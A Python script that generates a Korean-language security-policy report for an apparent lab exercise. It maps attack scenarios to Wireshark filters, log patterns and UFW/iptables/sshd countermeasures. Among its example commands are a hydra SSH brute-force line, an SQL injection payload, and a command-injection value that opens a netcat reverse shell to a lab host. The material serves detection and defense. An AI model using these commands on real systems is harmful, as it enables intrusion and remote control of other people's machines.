#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import argparse
from dataclasses import dataclass
from datetime import date
from typing import Optional

from docx import Document
from docx.enum.table import WD_CELL_VERTICAL_ALIGNMENT, WD_TABLE_ALIGNMENT
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Mm, Pt


@dataclass(frozen=True)
class Scenario:
    number: str
    name: str
    technique: str
    data_sources: str
    identify: str
    observed: str
    follow_up: str
    evidence_id: str


def _set_run_font(run, font_name: str, size_pt: Optional[int] = None) -> None:
    run.font.name = font_name
    r_pr = run._element.get_or_add_rPr()
    r_fonts = r_pr.get_or_add_rFonts()
    r_fonts.set(qn("w:eastAsia"), font_name)
    if size_pt is not None:
        run.font.size = Pt(size_pt)


def _set_paragraph_font(paragraph, font_name: str, size_pt: Optional[int] = None) -> None:
    for run in paragraph.runs:
        _set_run_font(run, font_name, size_pt=size_pt)


def _set_style_font(style, font_name: str) -> None:
    style.font.name = font_name
    r_pr = style._element.get_or_add_rPr()
    r_fonts = r_pr.get_or_add_rFonts()
    r_fonts.set(qn("w:eastAsia"), font_name)


def _set_document_defaults(document: Document) -> None:
    section = document.sections[0]
    section.page_width = Mm(210)
    section.page_height = Mm(297)
    section.top_margin = Mm(20)
    section.bottom_margin = Mm(20)
    section.left_margin = Mm(20)
    section.right_margin = Mm(20)

    base_font = "맑은 고딕"
    normal = document.styles["Normal"]
    _set_style_font(normal, base_font)
    normal.font.size = Pt(11)

    for style_name in ["Heading 1", "Heading 2", "Title"]:
        _set_style_font(document.styles[style_name], base_font)


def _add_field_toc(document: Document, max_level: int = 2) -> None:
    p = document.add_paragraph()
    fld = OxmlElement("w:fldSimple")
    fld.set(qn("w:instr"), f'TOC \\\\o "1-{max_level}" \\\\h \\\\z \\\\u')
    r = OxmlElement("w:r")
    t = OxmlElement("w:t")
    t.text = "(Word에서 필드 업데이트 시 목차가 생성됩니다)"
    r.append(t)
    fld.append(r)
    p._p.append(fld)


def _add_table(
    document: Document,
    title: str,
    rows: list[list[str]],
    column_width_mm: Optional[list[float]] = None,
    header_bold: bool = True,
) -> None:
    caption = document.add_paragraph(title)
    if caption.runs:
        caption.runs[0].bold = True
    _set_paragraph_font(caption, "맑은 고딕")

    table = document.add_table(rows=len(rows), cols=len(rows[0]))
    table.style = "Table Grid"
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    table.autofit = False

    for r_idx, row in enumerate(rows):
        for c_idx, cell_text in enumerate(row):
            cell = table.cell(r_idx, c_idx)
            cell.text = cell_text
            cell.vertical_alignment = WD_CELL_VERTICAL_ALIGNMENT.CENTER
            for paragraph in cell.paragraphs:
                _set_paragraph_font(paragraph, "맑은 고딕")
                if r_idx == 0 and header_bold:
                    for run in paragraph.runs:
                        run.bold = True

    if column_width_mm:
        for c_idx, width in enumerate(column_width_mm):
            for row in table.rows:
                row.cells[c_idx].width = Mm(width)

    document.add_paragraph("")


def _add_figure_placeholder(
    document: Document, title: str, evidence_id: str, note: str, *, height_mm: float = 55
) -> None:
    caption = document.add_paragraph(title)
    if caption.runs:
        caption.runs[0].bold = True
    _set_paragraph_font(caption, "맑은 고딕")

    table = document.add_table(rows=1, cols=1)
    table.style = "Table Grid"
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    table.autofit = False

    cell = table.cell(0, 0)
    cell.text = f"[증빙자료 삽입 위치]  ID: {evidence_id}\n{note}"
    cell.vertical_alignment = WD_CELL_VERTICAL_ALIGNMENT.CENTER
    table.rows[0].height = Mm(height_mm)

    for paragraph in cell.paragraphs:
        paragraph.alignment = WD_ALIGN_PARAGRAPH.CENTER
        _set_paragraph_font(paragraph, "맑은 고딕")
        for run in paragraph.runs:
            run.italic = True

    document.add_paragraph("")


def _add_title_page(document: Document, report_title: str) -> None:
    p = document.add_paragraph(report_title)
    p.style = document.styles["Title"]
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    _set_paragraph_font(p, "맑은 고딕", size_pt=28)

    subtitle = document.add_paragraph("(결과보고서)")
    subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
    _set_paragraph_font(subtitle, "맑은 고딕", size_pt=16)

    document.add_paragraph("")
    info = document.add_paragraph(f"작성일: {date.today().isoformat()}  |  버전: v1.0")
    info.alignment = WD_ALIGN_PARAGRAPH.CENTER
    _set_paragraph_font(info, "맑은 고딕", size_pt=12)

    document.add_paragraph("")
    owner = document.add_paragraph("작성자/팀: (기입)")
    owner.alignment = WD_ALIGN_PARAGRAPH.CENTER
    _set_paragraph_font(owner, "맑은 고딕", size_pt=12)

    document.add_page_break()


def build_report(output_path: str) -> None:
    document = Document()
    _set_document_defaults(document)

    _add_title_page(document, "보안정책 구현")

    _add_table(
        document,
        "표 0-1. 문서 정보",
        [
            ["항목", "내용"],
            ["문서명", "보안정책 구현 결과보고서"],
            ["문서번호", "(기입)"],
            ["대상", "(프로젝트/시스템명 기입)"],
            ["작성일", date.today().isoformat()],
            ["작성자", "(기입)"],
            ["검토/승인", "(기입)"],
        ],
        column_width_mm=[35, 135],
    )

    _add_table(
        document,
        "표 0-2. 개정 이력",
        [
            ["버전", "일자", "작성자", "변경 내용"],
            ["v1.0", date.today().isoformat(), "(기입)", "초안 작성"],
        ],
        column_width_mm=[18, 30, 30, 92],
    )

    _add_table(
        document,
        "표 0-3. 참고 문서(근거)",
        [
            ["번호", "문서명", "활용 목적"],
            ["R1", "2차 프로젝트 기획안 v0.4.1(퍼플).pdf", "프로젝트 범위/구성 및 관제·점검 목표 정의 확인"],
            ["R2", "기획안 주정통 코드 부분.pdf", "주정통 기반 자동화(스크립트/함수) 구성 정의 확인"],
            ["R3", "네트워크 보안관제 보고서.pdf", "시나리오별 Wireshark 필터 및 정상/비정상 식별 기준 정리"],
            ["R4", "서버 보안 정책 문서(미완성).pdf", "공격 시나리오별 로그 패턴 및 UFW/iptables/sshd_config 대응 가이드 기반 정리"],
        ],
        column_width_mm=[12, 78, 80],
    )

    toc_title = document.add_paragraph("목차")
    toc_title.style = document.styles["Heading 1"]
    _set_paragraph_font(toc_title, "맑은 고딕")
    note = document.add_paragraph("※ Word에서 '필드 업데이트'를 실행하면 자동 목차가 생성/갱신됩니다.")
    _set_paragraph_font(note, "맑은 고딕")
    _add_field_toc(document, max_level=2)
    document.add_page_break()

    h5 = document.add_paragraph("5. 보안정책 구현")
    h5.style = document.styles["Heading 1"]
    _set_paragraph_font(h5, "맑은 고딕")

    intro = document.add_paragraph(
        "본 장은 네트워크/서버 관제 수행 결과를 기반으로 보안 정책을 구현하고, "
        "시나리오 기반 공격 검증 과정에서 확인된 비정상 징후(패킷/로그)와 대응 방안을 결과 중심으로 정리한다. "
        "PCAP, Wireshark 캡처, Snort 경보, 터미널 출력, 로그 캡처 등 증빙자료는 후속 삽입을 전제로 자리표시자만 포함한다."
    )
    _set_paragraph_font(intro, "맑은 고딕")

    _add_table(
        document,
        "표 5-1. 수행 개요(요약)",
        [
            ["구분", "내용"],
            ["수행 목적", "시나리오 기반 공격 징후 식별 및 보안정책(탐지/차단/운영절차) 구현 결과 정리"],
            ["수행 범위", "네트워크 패킷 분석(Wireshark), 서버 로그 분석(auth/syslog/apache/kern), 차단 정책(UFW/iptables)"],
            ["관제 산출물", "정상/비정상 판별 기준, 공격 시나리오별 로그 패턴, 차단/대응 Runbook, 정책 구현 매트릭스"],
            ["증빙 삽입 원칙", "각 표/그림의 증빙 ID에 맞춰 PCAP·이미지·로그를 삽입(파일명·시간·대상 자산 표기)"],
        ],
        column_width_mm=[35, 135],
    )

    _add_table(
        document,
        "표 5-2. 관제/점검 대상 자산(요약, 필요 시 수정)",
        [
            ["구분", "자산/역할", "IP/대역", "OS", "주요 서비스", "비고"],
            ["서버", "SSH 대상 서버", "10.4.0.3", "Ubuntu", "OpenSSH", "시나리오(SSH 스캔/브루트포스) 기준"],
            ["서버", "공격자(테스트) 서버", "10.4.0.4", "Kali", "nmap/hydra/nc", "내부 테스트 목적"],
            ["서버", "DNS/DVWA(웹) 서버", "172.16.18.28", "(기입)", "BIND, Apache(DVWA)", "시나리오(AXFR/WhatWeb/SQLi/Reverse/DoS) 기준"],
            ["서버", "Core 서버(예시)", "172.16.16.1", "Ubuntu/Rocky9", "DHCP/Apache/DB 등", "자동화 스크립트 입력 예시 기준"],
            ["네트워크", "내부망(예시)", "172.16.0.0/16", "-", "-", "웹 접근 허용 대역 예시"],
            ["-", "(추가 기입)", "(기입)", "(기입)", "(기입)", "(기입)"],
        ],
        column_width_mm=[16, 40, 32, 22, 38, 22],
    )

    _add_table(
        document,
        "표 5-3. 증빙자료 ID 체계(삽입 예정)",
        [
            ["구분", "ID 예시", "증빙 형태", "비고"],
            ["패킷", "PCAP-5-01", "pcap/pcapng", "Wireshark 재현 가능하도록 기간/필터 기입"],
            ["Wireshark", "WS-5-01", "캡처 이미지", "필터/표시 필드가 보이도록 캡처"],
            ["Snort", "SN-5-01", "경보 화면 캡처", "SID/Message/시간/출발지·목적지 포함"],
            ["터미널", "TERM-5-01", "명령/출력 캡처", "명령 전체와 결과(리턴코드 포함)"],
            ["로그", "LOG-5-01", "로그 캡처", "경로/타임스탬프/키워드 강조"],
        ],
        column_width_mm=[24, 24, 45, 77],
    )

    _add_figure_placeholder(
        document,
        "그림 5-1. 관제→분석→대응→정책 반영 흐름(증빙 삽입)",
        "IMG-5-01",
        "흐름도/아키텍처(관제 플랫폼, 로그 수집, 차단 지점, 대시보드 등) 이미지를 삽입",
    )

    document.add_page_break()

    h51 = document.add_paragraph("5.1. 관제 수행 결과")
    h51.style = document.styles["Heading 2"]
    _set_paragraph_font(h51, "맑은 고딕")

    p = document.add_paragraph(
        "관제 수행은 네트워크 패킷 분석(Wireshark)과 서버 로그(auth.log/syslog/apache/kern) 분석을 병행하여 "
        "정상/비정상 행위의 판별 기준을 정의하고, 시나리오 기반 공격 수행 시 생성되는 흔적을 식별·분류하는 방식으로 진행하였다."
    )
    _set_paragraph_font(p, "맑은 고딕")

    _add_table(
        document,
        "표 5-4. 수집 로그/데이터 및 확인 포인트",
        [
            ["데이터", "수집 위치(예시)", "확인 포인트", "증빙 ID"],
            ["패킷 캡처", "(관제 PCAP 저장소)", "ARP 변조/스캔/FTP 평문/HTTP 요청 등", "PCAP-5-01"],
            ["인증 로그", "/var/log/auth.log (또는 /var/log/secure)", "SSH 스캔/브루트포스/로그인 성공·실패", "LOG-5-01"],
            ["시스템 로그", "/var/log/syslog", "DNS AXFR 전송 시작/종료, 서비스 이벤트", "LOG-5-02"],
            ["웹 접근 로그", "/var/log/apache2/*.log", "정찰(whatweb)/SQLi/Command Injection 접근 패턴", "LOG-5-03"],
            ["커널/네트워크", "/var/log/kern.log 또는 dmesg", "SYN Flooding 등 DoS 징후", "LOG-5-04"],
            ["방화벽", "UFW/iptables 로그(필요 시)", "차단 발생 시점/대상 IP/포트", "LOG-5-05"],
        ],
        column_width_mm=[26, 62, 62, 20],
    )

    _add_table(
        document,
        "표 5-5. 사용 도구 및 활용 목적",
        [
            ["도구", "활용 목적", "산출물"],
            ["Wireshark", "패킷 필터 기반 정상/비정상 트래픽 식별", "필터/판별 기준, 캡처 이미지"],
            ["서버 로그 분석(tail/grep)", "공격 시나리오별 로그 패턴 확인", "핵심 로그 경로, 키워드"],
            ["UFW/iptables", "시나리오별 차단 정책 적용(접근통제/율제한) 및 재현 검증", "차단 규칙, 적용/검증 결과"],
            ["(선택) Snort/관제 플랫폼", "탐지 룰 기반 경보 생성 및 상관관계 분석", "룰셋/경보 화면(증빙)"],
        ],
        column_width_mm=[40, 75, 55],
    )

    scenarios: list[Scenario] = [
        Scenario(
            number="S1-1",
            name="ARP Spoofing",
            technique="동일 IP에 대한 MAC 주소 지속 변조",
            data_sources="패킷",
            identify="Wireshark 필터: arp",
            observed="동일 IP의 ARP Reply에서 MAC 변경 반복(비정상 징후)",
            follow_up="스위치 보안(DAI)·정적 ARP·탐지 룰 적용 검토",
            evidence_id="WS-5-01/PCAP-5-01",
        ),
        Scenario(
            number="S1-2",
            name="FTP 패킷 스니핑",
            technique="평문 Payload 내 계정정보 노출",
            data_sources="패킷",
            identify="Wireshark 필터: ftp || tcp.port == 21",
            observed="Payload 구간에서 인증정보 노출 여부 확인",
            follow_up="FTP 사용 제한 및 SFTP/FTPS 전환 권고",
            evidence_id="WS-5-02/PCAP-5-02",
        ),
        Scenario(
            number="S1-3",
            name="Nmap 스캔(SSH 서비스 식별)",
            technique="포트 존재/버전 수집(정찰)",
            data_sources="패킷+auth.log",
            identify="Wireshark: tcp.flags.syn == 1 / 로그: 사용자·비번 실패/세션 생성 없음",
            observed="nmap -sV -p 22 10.4.0.3 수행 흔적이 auth.log에 기록",
            follow_up="관리망만 SSH 허용 및 스캔 차단(iptables recent) 적용",
            evidence_id="LOG-5-01/TERM-5-01",
        ),
        Scenario(
            number="S1-4",
            name="SSH Brute Force(Hydra)",
            technique="짧은 시간 대량 인증 실패 및 MaxStartups throttling",
            data_sources="패킷+auth.log",
            identify="Wireshark: tcp.port == 22 / 로그: 동일 IP 반복 실패",
            observed="hydra -l root -P /root/test.txt 10.4.0.3 ssh 수행 시도 확인",
            follow_up="키 기반 인증 전환 + 자동 차단(60초/5회) 적용",
            evidence_id="LOG-5-01/TERM-5-02",
        ),
        Scenario(
            number="S1-5",
            name="DNS AXFR(Zone Transfer)",
            technique="존 파일 무단 전송(정보 노출)",
            data_sources="패킷+syslog",
            identify="Wireshark: tcp.port == 53 / syslog: AXFR started/ended",
            observed="dig axfr wj.com @172.16.18.28 수행 및 전송 로그 확인",
            follow_up="TCP 53 제한(Secondary DNS만 허용) 정책 적용",
            evidence_id="LOG-5-02/WS-5-03",
        ),
        Scenario(
            number="S1-6",
            name="웹 정찰(whatweb)",
            technique="기술스택/구성 정보 수집(Enumeration)",
            data_sources="패킷+apache access.log",
            identify="Wireshark: http / 로그: whatweb 접근 기록",
            observed="whatweb dvwa.wj.com 요청이 access.log에 기록",
            follow_up="내부 전용 서비스일 경우 80/443 접근대역 제한 권고",
            evidence_id="LOG-5-03/TERM-5-03",
        ),
        Scenario(
            number="S1-7",
            name="SQL Injection 시도",
            technique="요청 인자(URL/폼) 내 SQL 예약어 포함",
            data_sources="패킷+apache access.log",
            identify="Wireshark: http.request.uri / 로그: 특정 페이지 연속 호출",
            observed="' OR '1'='1' # 등 페이로드 흔적 및 접근 패턴 확인",
            follow_up="L3/L4 방화벽만으로 차단 한계 → WAF/애플리케이션 보완 필요",
            evidence_id="LOG-5-03/WS-5-04",
        ),
        Scenario(
            number="S1-8",
            name="Command Injection & Reverse Shell",
            technique="/vulnerabilities/exec/ 반복 POST 및 nc 역접속",
            data_sources="패킷+apache access.log",
            identify="로그: 비정상 경로 반복/페이로드 포함",
            observed="127.0.0.1; nc 10.4.0.4 4444 -e /bin/sh 시도 흔적 확인",
            follow_up="취약 기능 접근통제/패치 + 아웃바운드 제어(egress) 및 탐지 룰 연계",
            evidence_id="LOG-5-03/TERM-5-04",
        ),
        Scenario(
            number="S1-9",
            name="DoS(SYN Flooding)",
            technique="커널 경고: Possible SYN flooding",
            data_sources="kern.log/dmesg",
            identify="TCP: Possible SYN flooding on port 80. Sending cookies.",
            observed="커널 로그에서 SYN Flood 징후 메시지 확인",
            follow_up="SYN cookies/율제한/상위 장비 차단 정책 적용 검토",
            evidence_id="LOG-5-04",
        ),
    ]

    rows = [["번호", "공격 시나리오", "관제 데이터", "식별 기준(요약)", "관측 결과(요약)", "후속 조치", "증빙 ID"]]
    for s in scenarios:
        rows.append(
            [s.number, f"{s.name}\n({s.technique})", s.data_sources, s.identify, s.observed, s.follow_up, s.evidence_id]
        )

    _add_table(
        document,
        "표 5-6. 시나리오별 탐지 결과 요약(패킷·로그)",
        rows,
        column_width_mm=[14, 44, 22, 34, 32, 32, 16],
    )

    _add_table(
        document,
        "표 5-7. Wireshark 필터 및 정상/비정상 판별 기준(요약)",
        [
            ["구분", "필터", "정상/비정상 식별 기준"],
            ["ARP Spoofing", "arp", "동일 IP에 대해 MAC 주소가 지속 변조되는지 확인"],
            ["FTP 스니핑", "ftp || tcp.port == 21", "Payload 내 계정 정보 노출 여부 확인"],
            ["SYN 스캔", "tcp.flags.syn == 1", "단시간 내 다수 포트 접속 시도(정찰)"],
            ["SSH Brute", "tcp.port == 22", "동일 IP에서 인증 시도 횟수 폭증"],
            ["DNS AXFR", "tcp.port == 53", "Zone Transfer 트래픽 여부 확인"],
            ["웹 정찰", "http", "스캐너/정찰 도구의 특징적 요청(UA/경로)"],
            ["SQLi", "http.request.uri", "요청 데이터에 DB 예약어/패턴 포함 여부"],
        ],
        column_width_mm=[30, 45, 95],
    )

    _add_figure_placeholder(
        document,
        "그림 5-2. Wireshark - ARP Spoofing 식별(증빙)",
        "WS-5-01",
        "필터(arp) 적용 화면 및 동일 IP의 MAC 변조 구간 강조",
    )
    _add_figure_placeholder(
        document,
        "그림 5-3. auth.log - SSH 스캔/브루트포스 로그 패턴(증빙)",
        "LOG-5-01",
        "nmap/hydra 수행 구간의 인증 실패 반복 및 MaxStartups 메시지 포함",
    )
    _add_figure_placeholder(
        document,
        "그림 5-4. syslog - DNS AXFR 전송 시작/종료 로그(증빙)",
        "LOG-5-02",
        "AXFR started/ended 및 전송 레코드 수 확인 가능하도록 캡처",
    )
    _add_figure_placeholder(
        document,
        "그림 5-5. Apache access.log - whatweb/SQLi/Reverse Shell 흔적(증빙)",
        "LOG-5-03",
        "DVWA 접근 경로(/login.php 등) 및 /vulnerabilities/exec/ 반복 요청 강조",
    )
    _add_figure_placeholder(
        document,
        "그림 5-6. kern.log/dmesg - SYN Flooding 징후(증빙)",
        "LOG-5-04",
        "TCP: Possible SYN flooding 메시지 및 발생 시각 포함",
    )

    detail_note = document.add_paragraph("※ 아래는 시나리오별 상세 결과(표/증빙 삽입용)이다.")
    _set_paragraph_font(detail_note, "맑은 고딕")
    document.add_page_break()

    scenario_overrides: dict[str, dict[str, str]] = {
        "S1-3": {
            "공격/검증 명령(예시)": "nmap -sV -p 22 10.4.0.3",
            "핵심 로그 경로(예시)": "/var/log/auth.log (또는 /var/log/secure)",
            "차단/대응(상세)": (
                "[SSHD]\n"
                "PermitRootLogin no\n"
                "PasswordAuthentication no\n"
                "PubkeyAuthentication yes\n\n"
                "[UFW]\n"
                "ufw allow from <관리망IP> to any port 22 proto tcp\n"
                "ufw deny 22\n\n"
                "[iptables]\n"
                "iptables -A INPUT -p tcp --dport 22 -m recent --name SCAN --set\n"
                "iptables -A INPUT -p tcp --dport 22 -m recent --name SCAN --update --seconds 10 --hitcount 10 -j DROP"
            ),
            "참고 문서": "R3, R4",
        },
        "S1-4": {
            "공격/검증 명령(예시)": "hydra -l root -P /root/test.txt 10.4.0.3 ssh",
            "핵심 로그 경로(예시)": "/var/log/auth.log (또는 /var/log/secure)",
            "차단/대응(상세)": (
                "iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH\n"
                "iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 5 --rttl --name SSH -j DROP\n"
                "Ubuntu/Debian: iptables-save > /etc/iptables/rules.v4\n"
                "Rocky/RHEL: service iptables save"
            ),
            "참고 문서": "R3, R4",
        },
        "S1-5": {
            "공격/검증 명령(예시)": "dig axfr wj.com @172.16.18.28",
            "핵심 로그 경로(예시)": "/var/log/syslog",
            "차단/대응(상세)": (
                "[UFW]\n"
                "ufw allow proto udp from any to any port 53\n"
                "ufw deny proto tcp from any to any port 53\n"
                "ufw allow proto tcp from <SECONDARY_DNS_IP> to any port 53\n\n"
                "[iptables]\n"
                "iptables -A INPUT -p udp --dport 53 -j ACCEPT\n"
                "iptables -A INPUT -p tcp --dport 53 -j DROP\n"
                "iptables -A INPUT -p tcp -s <SECONDARY_DNS_IP> --dport 53 -j ACCEPT"
            ),
            "참고 문서": "R3, R4",
        },
        "S1-6": {
            "공격/검증 명령(예시)": "whatweb dvwa.wj.com",
            "핵심 로그 경로(예시)": "/var/log/apache2/dvwa_access.log",
            "차단/대응(상세)": (
                "(내부 전용 서비스 전제) TRUSTED_NET만 80/443 허용 후 외부 차단\n"
                "iptables -A INPUT -p tcp -s <TRUSTED_NET> --dport 80 -j ACCEPT\n"
                "iptables -A INPUT -p tcp -s <TRUSTED_NET> --dport 443 -j ACCEPT\n"
                "iptables -A INPUT -p tcp --dport 80 -j DROP\n"
                "iptables -A INPUT -p tcp --dport 443 -j DROP"
            ),
            "참고 문서": "R3, R4",
        },
        "S1-7": {
            "공격/검증 명령(예시)": "(예) ' OR '1'='1' #",
            "핵심 로그 경로(예시)": "/var/log/apache2/dvwa_access.log",
            "차단/대응(상세)": "L3/L4 방화벽만으로 페이로드 차단 한계 → WAF/입력검증/파라미터 바인딩 등 애플리케이션 조치 필요",
            "참고 문서": "R3, R4",
        },
        "S1-8": {
            "공격/검증 명령(예시)": "127.0.0.1; nc 10.4.0.4 4444 -e /bin/sh",
            "핵심 로그 경로(예시)": "/var/log/apache2/dvwa_access.log",
            "차단/대응(상세)": "취약 기능 제거/패치 + 아웃바운드(egress) 제어(예: 4444/tcp 차단) + 관제 룰 연계",
            "참고 문서": "R4",
        },
        "S1-9": {
            "공격/검증 명령(예시)": "(기입)",
            "핵심 로그 경로(예시)": "/var/log/kern.log 또는 dmesg",
            "차단/대응(상세)": "SYN cookies/레이트리밋/상위 장비 ACL 등 단계적 적용 후 재현 테스트로 검증",
            "참고 문서": "R4",
        },
    }

    for idx, s in enumerate(scenarios):
        overrides = scenario_overrides.get(s.number, {})

        detail_rows = [
            ["항목", "내용"],
            ["시나리오", f"{s.number} / {s.name}"],
            ["공격 기법", s.technique],
            ["관제 데이터", s.data_sources],
            ["식별 기준(필터/키워드)", s.identify],
            ["관측 결과(요약)", s.observed],
            ["대응/후속 조치(요약)", s.follow_up],
            ["공격/검증 명령(예시)", overrides.get("공격/검증 명령(예시)", "(기입)")],
            ["핵심 로그 경로(예시)", overrides.get("핵심 로그 경로(예시)", "(기입)")],
            [
                "차단/대응(상세)",
                overrides.get(
                    "차단/대응(상세)",
                    "(정책/룰/운영절차 기입. 예: UFW/iptables/SSHD/WAF/ACL 등)",
                ),
            ],
            ["검증 방법", "정책 적용 전/후 동일 시나리오를 재현하여 탐지/차단 여부를 확인"],
            ["증빙 ID", s.evidence_id],
            ["참고 문서", overrides.get("참고 문서", "R3, R4")],
        ]

        _add_table(
            document,
            f"표 5.1-{idx + 1}. 시나리오 상세({s.number} {s.name})",
            detail_rows,
            column_width_mm=[40, 130],
        )

        _add_figure_placeholder(
            document,
            f"그림 5.1-{idx + 1}. {s.number} 증빙자료(삽입)",
            s.evidence_id,
            "PCAP/Wireshark/터미널/로그 캡처를 시나리오별로 삽입",
            height_mm=75,
        )

        if idx != len(scenarios) - 1:
            document.add_page_break()

    document.add_page_break()

    h52 = document.add_paragraph("5.2 대응 방안")
    h52.style = document.styles["Heading 2"]
    _set_paragraph_font(h52, "맑은 고딕")

    p = document.add_paragraph(
        "대응 방안은 (1) 관제팀-운영팀 협조 체계, (2) 즉시 차단(Containment) 중심의 네트워크/서버 정책, "
        "(3) 재발 방지(근본 원인 제거) 항목으로 구성하였다."
    )
    _set_paragraph_font(p, "맑은 고딕")

    _add_table(
        document,
        "표 5-8. 대응 프로세스(탐지→분석→차단→복구)",
        [
            ["단계", "주요 활동", "담당(예시)", "산출물/증빙"],
            ["1) 탐지", "경보/로그/패킷 이상 징후 확인", "관제팀", "탐지 알림, 초기 증빙(PCAP/로그)"],
            ["2) 분석", "공격 유형 분류, 영향도/범위 산정", "관제팀+운영팀", "분석 리포트, 타임라인"],
            ["3) 차단", "출발지/포트/서비스 차단, 계정 잠금", "운영팀", "방화벽/서버 정책 적용 결과"],
            ["4) 제거", "취약점 패치, 설정 변경, 악성 요소 제거", "운영팀", "조치 내역서"],
            ["5) 복구", "서비스 정상화, 모니터링 강화", "운영팀", "복구 체크리스트"],
            ["6) 환류", "재발방지 대책/룰 튜닝/문서화", "관제팀+운영팀", "정책 업데이트, 교육/점검"],
        ],
        column_width_mm=[18, 66, 36, 50],
    )

    _add_table(
        document,
        "표 5-9. 로그 제출 및 대응 협조 요청 기준(요약)",
        [
            ["상황", "필수 로그", "권장 로그", "제출 형태"],
            ["웹 공격(정찰/SQLi/Command Injection)", "access.log", "error.log, WAF 로그(있을 시)", "원본 파일 또는 캡처"],
            ["SSH 정찰/브루트포스/침해", "auth.log(/secure)", "sshd 설정 파일 변경 이력", "원본 파일 또는 캡처"],
            ["DNS AXFR/의심 질의", "syslog", "named 로그(있을 시)", "원본 파일 또는 캡처"],
            ["DoS 의심", "kern.log/dmesg", "방화벽/라우터 로그", "원본 파일 또는 캡처"],
        ],
        column_width_mm=[46, 42, 52, 30],
    )

    _add_table(
        document,
        "표 5-10. 시나리오별 대응 Runbook(요약)",
        [
            ["공격 유형", "초기 확인", "즉시 차단(예시)", "재발방지(예시)", "증빙 ID"],
            ["ARP Spoofing", "동일 IP의 MAC 변경 반복 여부", "스위치 보안 기능/정적 ARP 적용(환경에 따라)", "네트워크 분리, ARP 모니터링(arpwatch) 적용", "WS-5-01"],
            ["FTP 스니핑", "Payload 내 계정정보 노출 여부", "FTP 차단/계정 비밀번호 변경", "SFTP/FTPS 전환, 평문 서비스 제거", "WS-5-02"],
            ["SSH 정찰/브루트", "auth.log에서 반복 실패/스캔 패턴", "UFW 접근대역 제한 + iptables recent 자동 차단", "키 기반 인증 강제, root 원격 로그인 금지", "LOG-5-01"],
            ["DNS AXFR", "syslog에 AXFR started/ended", "TCP 53 차단(Secondary DNS만 허용)", "DNS 설정 allow-transfer 제한", "LOG-5-02"],
            ["웹 정찰/SQLi", "access.log에서 비정상 경로/페이로드", "(내부 서비스일 경우) 80/443 접근대역 제한", "WAF/입력검증/파라미터 바인딩 적용", "LOG-5-03"],
            ["Reverse Shell", "/vulnerabilities/exec/ 반복 POST", "의심 IP 차단, 아웃바운드(egress) 제한", "취약 기능 제거/패치, 권한 최소화", "LOG-5-03"],
            ["DoS(SYN Flood)", "kern.log/dmesg 경고 확인", "율제한/상위 장비 차단(ACL)", "서비스 보호(캐시/레이트리밋), 모니터링 강화", "LOG-5-04"],
        ],
        column_width_mm=[26, 36, 46, 46, 16],
    )

    _add_table(
        document,
        "표 5-11. 차단 정책(예시) 적용 요약",
        [
            ["항목", "정책/설정", "설명"],
            ["SSH root 로그인 차단", "PermitRootLogin no", "root 직접 로그인 금지(일반 계정 + sudo)"],
            ["SSH 비밀번호 로그인 금지", "PasswordAuthentication no\nPubkeyAuthentication yes", "Brute Force 원천 차단"],
            ["UFW SSH 접근대역 제한", "ufw allow from <관리망IP> to any port 22 proto tcp\nufw deny 22", "관리망/점프서버만 허용"],
            ["iptables Brute Force 차단", "-m recent --seconds 60 --hitcount 5 -j DROP", "60초 내 5회 이상 신규 연결 차단"],
            ["DNS AXFR 차단", "UDP 53 허용, TCP 53 기본 차단\nSecondary DNS만 TCP 53 허용", "AXFR은 TCP 53 기반"],
            ["웹 접근 통제(선택)", "80/443: <TRUSTED_NET>만 허용 후 DROP", "내부 전용 서비스 전제"],
        ],
        column_width_mm=[40, 64, 66],
    )

    _add_figure_placeholder(
        document,
        "그림 5-7. 차단 정책 적용 터미널 출력(증빙)",
        "TERM-5-05",
        "sshd_config/UFW/iptables 적용 및 status/규칙 확인 화면 삽입",
    )

    document.add_page_break()

    h53 = document.add_paragraph("5.3 보안 정책 구현")
    h53.style = document.styles["Heading 2"]
    _set_paragraph_font(h53, "맑은 고딕")

    p = document.add_paragraph(
        "보안 정책 구현은 ‘탐지(Detect)–차단(Prevent)–운영(Operate)’ 관점에서 정리하였으며, "
        "각 항목은 적용 여부와 검증 방법(증빙)을 명확히 기록하도록 구성하였다."
    )
    _set_paragraph_font(p, "맑은 고딕")

    _add_table(
        document,
        "표 5-12. 보안 정책 구현 매트릭스(요약)",
        [
            ["영역", "정책 항목", "구현 위치", "구현 내용(요약)", "상태", "검증/증빙"],
            ["계정/접근", "SSH root 직접 로그인 차단", "서버(SSHD)", "PermitRootLogin no", "(기입)", "TERM-5-05"],
            ["계정/접근", "SSH 패스워드 로그인 금지", "서버(SSHD)", "PasswordAuthentication no", "(기입)", "TERM-5-05"],
            ["계정/접근", "관리망만 SSH 허용", "서버(UFW)", "allow from <관리망> / deny 22", "(기입)", "TERM-5-05"],
            ["네트워크", "SSH 스캔/브루트포스 자동 차단", "서버(iptables)", "recent 모듈 기반 율제한", "(기입)", "TERM-5-05"],
            ["DNS", "AXFR 제한", "서버(UFW/iptables/DNS 설정)", "TCP 53 제한, allow-transfer 통제", "(기입)", "LOG-5-02"],
            ["웹", "정찰 차단(내부 전용 시)", "서버(iptables/UFW)", "80/443 접근대역 제한", "(선택)", "TERM-5-05"],
            ["관제", "로그 수집 기준 수립", "운영절차", "access/auth/syslog/kern 로그 제출", "완료", "표 5-9"],
            ["관제", "시나리오별 판별 기준 수립", "관제 운영", "Wireshark 필터/로그 패턴 정의", "완료", "표 5-6"],
        ],
        column_width_mm=[20, 38, 26, 50, 16, 20],
    )

    _add_table(
        document,
        "표 5-13. iptables recent 옵션 의미(요약)",
        [
            ["옵션", "의미"],
            ["--dport 22", "SSH 포트 접근 대상"],
            ["--state NEW", "새 연결 시도에 한정"],
            ["-m recent --set", "접속 기록을 메모리에 저장"],
            ["--name SSH", "기록 이름(그룹)"],
            ["--seconds 60", "최근 60초 기준"],
            ["--hitcount 5", "5회 이상 시 차단"],
            ["--rttl", "동일 TTL 조건(위장 스캔 방지 보조)"],
            ["-j DROP", "조건 만족 시 패킷 폐기"],
        ],
